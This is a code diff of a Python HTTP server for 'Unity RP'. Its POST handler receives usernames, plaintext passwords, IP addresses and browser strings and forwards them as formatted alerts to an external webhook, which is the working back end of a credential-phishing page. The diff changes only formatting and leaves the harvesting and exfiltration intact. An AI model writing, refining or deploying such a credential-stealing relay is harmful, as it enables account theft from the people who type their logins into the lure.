@@ -1,4 +1,3 @@
-
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import json
 import datetime
@@ -25,27 +24,25 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 post_data = self.rfile.read(content_length)
                 data = json.loads(post_data.decode('utf-8'))
 
-                now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                
+                now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
                 username = data.get('username', 'Inconnu')
                 password = data.get('password', 'Inconnu')
                 ip_addr = data.get('ip', 'Non spécifiée')
                 user_agent = data.get('userAgent', 'Non spécifié')
 
-                print(f"[EXPERT] Données reçues pour : {username}")
-
                 msg = (
                     f"🚨 **NOUVELLE CONNEXION UNITY RP** [{now}] 🚨\n"
-                    f"👤 **Utilisateur :** {username}\n"
-                    f"🔑 **Mot de passe :** {password}\n"
-                    f"🌐 **Adresse IP :** {ip_addr}\n"
-                    f"💻 **Navigateur :** {user_agent}"
+                    f"👤 **Utilisateur :** `{username}`\n"
+                    f"🔑 **Mot de passe :** `{password}`\n"
+                    f"🌍 **Adresse IP :** `{ip_addr}`\n"
+                    f"💻 **Navigateur :** `{user_agent}`"
                 )
 
                 payload = json.dumps({"content": msg}).encode('utf-8')
                 req = urllib.request.Request(
-                    WEBHOOK_URL, 
-                    data=payload, 
+                    WEBHOOK_URL,
+                    data=payload,
                     headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                 )
 
@@ -57,7 +54,7 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
 
             except Exception as e:
-                print(f"[ERREUR SERVEUR] {e}")
+                print(f"ERREUR SERVEUR: {e}")
                 self.send_response(500)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
@@ -67,7 +64,7 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
 
 if __name__ == '__main__':
     os.chdir(os.path.dirname(os.path.abspath(__file__)))
-    port = int(os.environ.get("PORT", 10000))
+    port = int(os.environ.get('PORT', 10000))
     server_address = ('', port)
     httpd = HTTPServer(server_address, UnityRPHandler)
     print(f"Serveur Python démarré sur le port {port}")
